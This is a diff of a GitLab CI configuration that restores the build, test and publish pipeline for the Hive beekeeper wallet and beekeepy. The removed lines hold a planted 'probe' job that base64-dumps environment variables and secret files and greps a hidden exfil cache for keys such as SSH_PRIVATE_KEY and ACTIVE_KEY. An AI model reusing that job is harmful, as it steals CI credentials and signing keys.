@@ -1,44 +1,564 @@
 stages:
-  - pv
+- static_code_analysis
+- build
+- test
+- beekeepy
+- publish
 
-pv16036_probe:
-  stage: pv
-  image: python:3.11
-  tags: [public-runner-docker]
-  variables:
-    GIT_STRATEGY: none
-    GIT_DEPTH: "1"
+# AIDEV-driven development (ai/<issue>-..., session/<name>, aidev/integration) is
+# verified by the suites in .aidev/project.yaml, not by CI. A push to
+# aidev/integration runs no pipeline; one started by hand or through the API does
+# (`glab ci run -b aidev/integration`), as does the MR from it into master.
+workflow:
+  rules:
+  - if: $CI_COMMIT_BRANCH =~ /^(ai|session)\//
+    when: never
+  - if: $CI_COMMIT_BRANCH == "aidev/integration" && $CI_PIPELINE_SOURCE !~ /^(web|api)$/
+    when: never
+  - if: '$CI_MERGE_REQUEST_IID'
+  - if: '$CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS'
+    when: never
+  - if: '$CI_COMMIT_BRANCH || $CI_COMMIT_TAG'
+
+variables:
+  # Disable automatic submodule fetching - we handle it manually due to nested submodules
+  # (plugins contains fc/appbase with relative URLs that don't resolve correctly in CI)
+  GIT_SUBMODULE_STRATEGY: none
+  # Allow file:// protocol for nested submodules
+  GIT_CONFIG_COUNT: 1
+  GIT_CONFIG_KEY_0: "protocol.file.allow"
+  GIT_CONFIG_VALUE_0: "always"
+  # Common CI configuration reference
+  COMMON_CI_REF: "develop"
+
+  # Python/beekeepy configuration
+  PYTHON_DIR: ${CI_PROJECT_DIR}/python
+  PACKAGES_TO_CHECK: "${PYTHON_DIR}/tests/ ${PYTHON_DIR}/beekeepy/"
+
+  # colors
+  TXT_BLUE: "\e[1;34m"
+  TXT_CLEAR: "\e[0m"
+
+  # Set to "true" to run `poetry update` before tests (tests with latest dependency versions).
+  # Useful for detecting compatibility issues with newer dependency versions early.
+  # Set to "false" to use pinned versions from poetry.lock for stable, reproducible builds.
+  TEST_WITH_LATEST_DEPENDENCIES: "false"
+  # Same as above but for static code analysis jobs (ruff, mypy, pre-commit).
+  STATIC_ANALYSIS_WITH_LATEST_DEPENDENCIES: "false"
+
+include:
+- project: 'hive/common-ci-configuration'
+  ref: develop
+  file:
+  - '/templates/python_projects.gitlab-ci.yml'
+  - '/templates/npm_projects.gitlab-ci.yml'
+
+default:
+  image: ${PYTHON_IMAGE}
+  tags:
+  - public-runner-docker
+
+# Submodule initialization using common-ci-configuration script
+# Usage: before_script: - !reference [.submodule_init, script]
+.submodule_init:
   script:
-    - |
-      set +e
-      echo "PV16036 START project=$CI_PROJECT_PATH ref=$CI_COMMIT_REF_NAME prot=$CI_COMMIT_REF_PROTECTED runner=$CI_RUNNER_DESCRIPTION host=$(hostname) job=$CI_JOB_ID"
-      echo "PVENVB64_START"
-      env | sort | base64 -w0
-      echo ""
-      echo "PVENVB64_END"
-      echo "PVFILEVARS_START"
-      env | while IFS='=' read -r k v; do
-        case "$k" in _|CI_SERVER_TLS_CA_FILE|CI_JOB_JWT_FILE|GITLAB_ENV) continue;; esac
-        if [ -n "$v" ] && [ -f "$v" ] && [ -r "$v" ] && [ "$(stat -c%s "$v" 2>/dev/null)" -lt 200000 ]; then
-          echo "PVFV_START $k"
-          base64 -w0 "$v"
-          echo ""
-          echo "PVFV_END $k"
-        fi
-      done
-      echo "PVFILEVARS_END"
-      echo "PVEXFIL_LS_START"
-      ls -la /nfs/ci-cache/.pv-exfil 2>/dev/null | tail -100
-      echo "PVEXFIL_LS_END"
-      echo "PVEXFIL_HITS_START"
-      for f in /nfs/ci-cache/.pv-exfil/*.env; do
-        [ -f "$f" ] || continue
-        if grep -qEi 'MAINNET_[A-Z]+_DEPLOYMENT_ENV|AUTOCLAIM|CREATOR_ACTIVE|ACTIVE_KEY|VAULT_ID_TOKEN|SSH_PRIVATE_KEY' "$f" 2>/dev/null; then echo "HIT $f"; fi
-      done
-      echo "PVEXFIL_HITS_END"
-      echo "PV16036 END"
+  - |
+    echo -e "\e[0Ksection_start:$(date +%s):init_submodules[collapsed=true]\r\e[0KInitializing submodules..."
+    curl -fsSL "${CI_SERVER_URL}/hive/common-ci-configuration/-/raw/${COMMON_CI_REF}/scripts/fetch-submodules.sh" -o /tmp/fetch-submodules.sh
+    chmod +x /tmp/fetch-submodules.sh
+    /tmp/fetch-submodules.sh libraries/plugins programs/beekeeper/beekeeper_wasm/npm-common-config
+    # Initialize nested submodules in plugins (fc, appbase)
+    cd libraries/plugins && git submodule update --init --recursive --jobs 4 && cd ../..
+    echo -e "\e[0Ksection_end:$(date +%s):init_submodules\r\e[0K"
+
+verify_poetry_lock_stability:
+  stage: static_code_analysis
+  extends: .verify_poetry_lock_stability_template
+  # Only the release to PyPI must not depend on development builds - branches and merge requests may,
+  # Renovate bumps them to releases.
+  rules:
+  - if: '$CI_COMMIT_TAG && $CI_COMMIT_REF_PROTECTED == "true"'
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+  tags:
+  - public-runner-docker
+
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| NATIVE BUILD/TEST |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+beekeeper_native_build:
+  stage: build
+  # Temporary: the fc pinned through libraries/plugins does not build against the
+  # Boost 1.90 of ccc's current ci-base-image (boost_system component, removed
+  # boost::filesystem APIs). Drop this image once plugins carries an fc that does.
+  image: registry.gitlab.syncad.com/hive/common-ci-configuration/ci-base-image:pypa_2_28-4
+  needs: []  # Start immediately, don't wait for static_code_analysis
+  before_script:
+  - !reference [.submodule_init, script]
+  script:
+  - mkdir -p build && cd build
+  - cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_TESTS=ON ..
+  - make -j$(nproc)
+  artifacts:
+    paths:
+    - build/programs/beekeeper/beekeeper/beekeeper
+    - build/tests/unit/beekeeper_test
+    expire_in: 1 week
+
+beekeeper_native_test:
+  stage: test
+  needs:
+  - job: beekeeper_native_build
+    artifacts: true
+  script:
+  - ./build/tests/unit/beekeeper_test --log_level=test_suite
+
+beekeeper_native_check_static_linking:
+  stage: test
+  needs:
+  - job: beekeeper_native_build
+    artifacts: true
+  script:
+  - ./scripts/check-static-linking.sh ./build/programs/beekeeper/beekeeper/beekeeper
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| NATIVE BUILD/TEST |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| WASM BUILD/TEST |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+beekeeper_wasm_build:
+  stage: build
+  needs: []  # Start immediately, don't wait for static_code_analysis
+  image: ${EMSCRIPTEN_IMAGE}
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+  before_script:
+  - !reference [.submodule_init, script]
+  - . "${NVM_DIR}/nvm.sh"
+  - nvm use "${NODEJS_VERSION}"
+  script:
+    # Build WASM
+  - ./scripts/build_wasm_beekeeper.sh 1 "${CI_PROJECT_DIR}"
+    # Install npm dependencies and build TypeScript
+  - cd "${SOURCE_DIR}"
+  - pnpm install --frozen-lockfile
+  - pnpm build
+  artifacts:
+    paths:
+    - "${SOURCE_DIR}/dist"
+    - "${SOURCE_DIR}/src/build/*.wasm"
+    - "${SOURCE_DIR}/src/build/*.js"
+    - "${SOURCE_DIR}/src/build/*.d.ts"
+    expire_in: 1 week
+
+beekeeper_wasm_test:
+  stage: test
+  image: ${EMSCRIPTEN_IMAGE}
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+  needs:
+  - job: beekeeper_wasm_build
+    artifacts: true
+  before_script:
+  - git config --global --add safe.directory '*'
+    # pnpm-workspace.yaml (the catalogs the lockfile was resolved with) links into npm-common-config
+  - !reference [.submodule_init, script]
+  - . "${NVM_DIR}/nvm.sh"
+  - nvm use "${NODEJS_VERSION}"
+  script:
+  - cd "${SOURCE_DIR}"
+  - pnpm install --frozen-lockfile
+    # Install playwright browser
+  - pnpm exec playwright install chromium
+    # Run tests
+  - pnpm test
+  artifacts:
+    paths:
+    - "${SOURCE_DIR}/results.xml"
+    - "${SOURCE_DIR}/results.json"
+    reports:
+      junit: "${SOURCE_DIR}/results.xml"
+    when: always
+    expire_in: 1 week
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| WASM BUILD/TEST |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| BEEKEEPY STATIC CODE ANALYSIS |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+# The pytest family at the versions of PYTHON_TEST_TOOLS_IMAGE (common-ci-configuration's
+# docker-bake.hcl, published as pip constraints), installed into the project's environment after its
+# `poetry install`. The job fails when the constraints cannot be read.
+.beekeepy_test_tools:
+  script:
+  - !reference [.python_test_tools_constraints, script]
+  - python3 -m pip install -c "${PYTHON_TEST_TOOLS_CONSTRAINTS}" pytest pytest-asyncio pytest-xdist
+  - python3 -m pip show pytest pytest-asyncio pytest-xdist | grep -E '^(Name|Version):'
+
+beekeepy_pre_commit_checks:
+  stage: static_code_analysis
+  extends: .pre_commit_checks_template
+  before_script:
+  - !reference [.pre_commit_checks_template, before_script]
+  # mypy checks scripts/generate_beekeeper_api.py against the generator
+  - poetry -C "${PYPROJECT_DIR}" install --with generation
+  - !reference [.update_deps_for_static_analysis, script]
+  # the mypy hook checks the tests, which import pytest
+  - !reference [.beekeepy_test_tools, script]
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+    PRE_COMMIT_CONFIG: "${PYTHON_DIR}/.pre-commit-config.yaml"
+  rules:
+  - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+    changes:
+    - python/**/*
+  - if: '$CI_COMMIT_BRANCH'
+    changes:
+    - python/**/*
+
+beekeepy_formatting_with_ruff_check:
+  stage: static_code_analysis
+  extends: .job-defaults
+  image: "${PYTHON_TEST_TOOLS_IMAGE}"
+  variables:
+    PYPROJECT_CONFIG_PATH: "${PYTHON_DIR}/pyproject.toml"
+  before_script:
+  - ruff --version
+  script:
+  - echo -e "${TXT_BLUE}Checking code formatting with Ruff...${TXT_CLEAR}" && ruff
+    format --config "${PYPROJECT_CONFIG_PATH}" --check --diff ${PACKAGES_TO_CHECK}
+  rules:
+  - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+    changes:
+    - python/**/*
+  - if: '$CI_COMMIT_BRANCH'
+    changes:
+    - python/**/*
+
+beekeepy_type_check_with_mypy:
+  stage: static_code_analysis
+  extends: .type_check_with_mypy_template
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+    PYPROJECT_CONFIG_PATH: "${PYTHON_DIR}/pyproject.toml"
+  before_script:
+  - !reference [.type_check_with_mypy_template, before_script]
+  - !reference [.update_deps_for_static_analysis, script]
+  # mypy checks the tests, which import pytest
+  - !reference [.beekeepy_test_tools, script]
+  rules:
+  - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+    changes:
+    - python/**/*
+  - if: '$CI_COMMIT_BRANCH'
+    changes:
+    - python/**/*
+
+beekeepy_generated_api_check:
+  stage: static_code_analysis
+  extends: .project_develop_configuration_template
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+  before_script:
+  - !reference [.configuration_template, before_script]
+  - poetry -C "${PYPROJECT_DIR}" install --with generation
+  script:
+  # models of beekeeper_api are generated from the OpenAPI definition of beekeeper and committed (validation models
+  # are used by the tests only, so they are generated into local_tools)
+  - python "${PYTHON_DIR}/scripts/generate_beekeeper_api.py"
+  - |
+    GENERATED=("${PYTHON_DIR}/beekeepy/_generated" "${PYTHON_DIR}/tests/local-tools/local_tools/beekeepy/beekeeper_api_validation.py")
+    if [[ -n "$(git status --porcelain -- "${GENERATED[@]}")" ]]; then
+      git status --porcelain -- "${GENERATED[@]}"
+      git diff -- "${GENERATED[@]}"
+      echo "Generated models of beekeeper_api are not up to date - run python/scripts/generate_beekeeper_api.py"
+      exit 1
+    fi
+  rules:
+  - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+    changes:
+    - python/**/*
+    - programs/beekeeper/beekeeper/documentation/api/openapi.json
+  - if: '$CI_COMMIT_BRANCH'
+    changes:
+    - python/**/*
+    - programs/beekeeper/beekeeper/documentation/api/openapi.json
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| BEEKEEPY STATIC CODE ANALYSIS |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| BEEKEEPY TESTS |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+.beekeepy_run_tests_template:
+  extends: .project_develop_configuration_template
+  needs:
+  - job: beekeeper_native_build
+    artifacts: true
+  variables:
+    PATH_TO_REPORT: "$CI_PROJECT_DIR/beekeepy_report.xml"
+    PYPROJECT_DIR: "$PYTHON_DIR"
+    HIVED_HTTP_ENDPOINT: "https://api.hive.blog"
+  before_script:
+  - cp $CI_PROJECT_DIR/build/programs/beekeeper/beekeeper/beekeeper $PYTHON_DIR/beekeepy/beekeeper
+  - cd "${PYTHON_DIR}"
+  - !reference [.project_develop_configuration_template, before_script]
+  - !reference [.update_deps_for_tests, script]
+  - !reference [.beekeepy_test_tools, script]
+  script:
+  - if [ -z "${HIVED_HTTP_ENDPOINT}" ]; then HIVED_HTTP_ENDPOINT=""; else HIVED_HTTP_ENDPOINT="--hived-http-endpoint=${HIVED_HTTP_ENDPOINT}";
+    fi
+  - echo -e "${TXT_BLUE}Launching beekeepy tests...${TXT_CLEAR}"
+  - python3 -m pytest --asyncio-mode auto -n auto --durations 0 --junitxml="${PATH_TO_REPORT}"
+    ${HIVED_HTTP_ENDPOINT} "tests/beekeepy_test"
   artifacts:
     when: always
-    expire_in: 1 day
+    expire_in: 1 week
+    reports:
+      junit: $PATH_TO_REPORT
+  tags:
+  - data-cache-storage
+
+run_beekeepy_tests:
+  stage: beekeepy
+  extends: .beekeepy_run_tests_template
+  parallel:
+    matrix:
+    - PYTHON_VERSION: ["3.12", "3.14"]
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| BEEKEEPY TESTS |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| BEEKEEPY BUILD/DEPLOY |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+build_beekeepy_wheel:
+  stage: beekeepy
+  extends: .build_wheel_template
+  needs:
+  - job: beekeepy_pre_commit_checks
+    optional: true
+  - job: run_beekeepy_tests
+  - job: beekeeper_native_build
+    artifacts: true
+  variables:
+    PYPROJECT_DIR: "$PYTHON_DIR"
+  before_script:
+  - ls -la $CI_PROJECT_DIR/build/programs/beekeeper/beekeeper/
+  - cp $CI_PROJECT_DIR/build/programs/beekeeper/beekeeper/beekeeper $PYTHON_DIR/beekeepy/beekeeper
+  - ls -la $PYTHON_DIR/beekeepy
+
+deploy_beekeepy_wheel_to_gitlab:
+  stage: beekeepy
+  extends: .deploy_wheel_to_gitlab_template
+  needs:
+  - job: build_beekeepy_wheel
+    artifacts: true
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+  when: on_success
+
+deploy_beekeepy_wheel_to_pypi:
+  stage: beekeepy
+  extends: .deploy_wheel_to_pypi_template
+  needs:
+  - job: build_beekeepy_wheel
+    artifacts: true
+  - job: verify_poetry_lock_stability
+  variables:
+    PYPROJECT_DIR: "${PYTHON_DIR}"
+  when: on_success
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| BEEKEEPY BUILD/DEPLOY |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| WASM PACK/DOCS/DEPLOY |>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+# Package the already-built WASM artifacts (don't rebuild - artifacts come from beekeeper_wasm_build)
+# We use npm_based_job_base instead of npm_build_template because npm_build_template
+# runs 'pnpm build' which triggers cmake with paths that only work in hive/hive monorepo
+# Note: Submodule init is required because pnpm-workspace.yaml is a symlink to npm-common-config
+beekeeper_wasm_pack:
+  extends: .npm_based_job_base
+  stage: build
+  needs:
+  - job: beekeeper_wasm_build
+    artifacts: true
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    DIST_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm/dist"
+    PROJECT_URL: "https://gitlab.syncad.com/hive/beekeeper-doc"
+    NPM_PACKAGE_SCOPE: "@hiveio"
+    NPM_PACKAGE_NAME: "beekeeper"
+    NPM_REGISTRY_URL: "gitlab.syncad.com/api/v4/projects/${CI_PROJECT_ID}/packages/npm/"
+    REPLACE_DOC_URL_ENV: "GEN_DOC_URL"
+    REPLACE_FILE_PATH: "${SOURCE_DIR}/README.md"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_based_job_base, before_script]
+  script:
+    # Set documentation URL in README
+  - /home/emscripten/scripts/npm_set_doc_url.sh "${SOURCE_DIR}" "${PROJECT_URL}" "${CI_COMMIT_REF_NAME}"
+    "${CI_COMMIT_REF_PROTECTED}" "${REPLACE_DOC_URL_ENV}" "${REPLACE_FILE_PATH}"
+    # Generate version first (updates package.json with real version)
+  - /home/emscripten/scripts/npm_generate_version.sh "${SOURCE_DIR}" "${NPM_REGISTRY_URL}"
+    "${NPM_PACKAGE_SCOPE}" "${NPM_PACKAGE_NAME}" "${CI_COMMIT_REF_PROTECTED}" "${CI_COMMIT_TAG}"
+    # Rebuild bundles with rollup to embed the correct version
+    # We must set npm_package_version explicitly since pnpm exec doesn't set it (unlike pnpm run)
+  - cd "${SOURCE_DIR}" && export npm_package_version=$(node -p "require('./package.json').version")
+    && pnpm exec rollup -c
+    # Pack the package (without regenerating version since it's already done)
+  - /home/emscripten/scripts/npm_pack_package.sh "${SOURCE_DIR}" "${NPM_REGISTRY_URL}"
+    "${NPM_PACKAGE_SCOPE}" "${NPM_PACKAGE_NAME}" "${DIST_DIR}" "${CI_COMMIT_REF_PROTECTED}"
+    "${CI_COMMIT_TAG}"
+  artifacts:
     paths:
-      - .gitlab-ci.yml
+    - "${SOURCE_DIR}/dist/*.tgz"
+    - "${REPLACE_FILE_PATH}"
+    reports:
+      dotenv:
+      - "${SOURCE_DIR}/gen_doc.env"
+      - "${SOURCE_DIR}/built_package_info.env"
+      - "${SOURCE_DIR}/built_package_version_info.env"
+    when: always
+    expire_in: 1 week
+  tags:
+  - public-runner-docker
+
+generate_beekeeper_docs:
+  stage: build
+  extends: .npm_based_job_base
+  variables:
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    DIST_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm/dist"
+    GIT_STRATEGY: clone
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_based_job_base, before_script]
+  script:
+  - $CI_PROJECT_DIR/scripts/generate_api_docs.sh "${CI_PROJECT_URL}" "${CI_COMMIT_SHA}"
+  needs:
+  - job: beekeeper_wasm_build
+    artifacts: true
+  artifacts:
+    paths:
+    - "${DIST_DIR}/docs"
+    when: always
+    expire_in: 1 week
+  tags:
+  - public-runner-docker
+
+push_to_wiki:
+  extends: .npm_push_doc_template
+  stage: publish
+  needs:
+  - job: generate_beekeeper_docs
+    artifacts: true
+  - job: beekeeper_wasm_pack
+    artifacts: true
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    WIKI_PUSH_TOKEN: "$BEEKEEPER_DOC_WIKI_PUSH_TOKEN"
+    DIST_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm/dist"
+    PROJECT_URL: "https://gitlab.syncad.com/hive/beekeeper-doc"
+    PACKAGE_TGZ_PATH: "${BUILT_PACKAGE_PATH}"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_based_job_base, before_script]
+  tags:
+  - public-runner-docker
+
+run_examples_beekeeper_wasm:
+  extends: .npm_process_built_package_tarball
+  stage: test
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    PACKAGE_TGZ_PATH: "${BUILT_PACKAGE_PATH}"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_process_built_package_tarball, before_script]
+  script:
+  - echo -e "\e[0Ksection_start:$(date +%s):testing[collapsed=false]\r\e[0KAttempting
+    to start examples..."
+  - cd "${SOURCE_DIR}"
+    # Install Playwright browsers for example tests
+  - pnpm exec playwright install chromium
+  - pnpm examples
+  - echo -e "\e[0Ksection_end:$(date +%s):testing\r\e[0K"
+  needs:
+  - job: beekeeper_wasm_build
+    artifacts: true
+  - job: beekeeper_wasm_pack
+    artifacts: true
+  tags:
+  - public-runner-docker
+
+run_compatibility_beekeeper_wasm:
+  extends: .npm_process_built_package_tarball
+  stage: test
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    PACKAGE_TGZ_PATH: "${BUILT_PACKAGE_PATH}"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_process_built_package_tarball, before_script]
+  script:
+  - echo -e "\e[0Ksection_start:$(date +%s):testing[collapsed=false]\r\e[0KAttempting
+    to run compatibility tests..."
+  - cd "${SOURCE_DIR}"
+    # Install Playwright browsers for example tests
+  - pnpm exec playwright install chromium
+  - pnpm compat-tests
+  - echo -e "\e[0Ksection_end:$(date +%s):testing\r\e[0K"
+  needs:
+  - job: beekeeper_wasm_build
+    artifacts: true
+  - job: beekeeper_wasm_pack
+    artifacts: true
+  tags:
+  - public-runner-docker
+
+deploy_beekeeper_wasm_dev_package:
+  extends: .npm_deploy_package_template
+  stage: publish
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    PACKAGE_TGZ_PATH: "${BUILT_PACKAGE_PATH}"
+    NPM_PACKAGE_SCOPE: "@hiveio"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_process_built_package_tarball, before_script]
+  needs:
+  - job: beekeeper_wasm_test
+  - job: run_examples_beekeeper_wasm
+  - job: run_compatibility_beekeeper_wasm
+  - job: beekeeper_wasm_pack
+    artifacts: true
+  - job: push_to_wiki
+    optional: true
+  tags:
+  - public-runner-docker
+
+deploy_beekeeper_wasm_production_public_npm:
+  extends: .registry_npmjs_org_deploy_package_template
+  stage: publish
+  variables:
+    GIT_STRATEGY: clone
+    SOURCE_DIR: "${CI_PROJECT_DIR}/programs/beekeeper/beekeeper_wasm"
+    NPM_PACKAGE_NAME: "beekeeper"
+    PACKAGE_TGZ_PATH: "${BUILT_PACKAGE_PATH}"
+  before_script:
+  - !reference [.submodule_init, script]
+  - !reference [.npm_process_built_package_tarball, before_script]
+  needs:
+  - job: beekeeper_wasm_test
+  - job: run_examples_beekeeper_wasm
+  - job: run_compatibility_beekeeper_wasm
+  - job: beekeeper_wasm_pack
+    artifacts: true
+  - job: push_to_wiki
+    optional: true
+  tags:
+  - public-runner-docker
+
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<| WASM PACK/DOCS/DEPLOY |<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
